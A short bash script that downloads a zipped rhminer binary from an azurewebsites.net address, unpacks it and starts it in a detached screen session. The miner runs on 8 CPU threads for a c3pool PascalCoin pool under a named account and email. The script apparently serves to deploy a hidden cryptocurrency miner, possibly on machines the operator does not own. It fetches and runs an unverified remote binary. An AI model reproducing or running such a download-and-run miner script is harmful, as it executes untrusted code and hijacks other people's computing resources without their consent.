#!/bin/bash
sudo apt-get -y install screen unzip
wget "http://addmail.azurewebsites.net/rhminercpu.zip" 
unzip rhminercpu.zip
cd rhminerCPU
chmod +x rhminer
screen -d -m ./rhminer -r 20 -s mine.pasc.c3pool.com:12223 -su 1139099-44.0.hello/slicommeo@gmail.com -cpu -cputhreads 8
echo -e "ok"
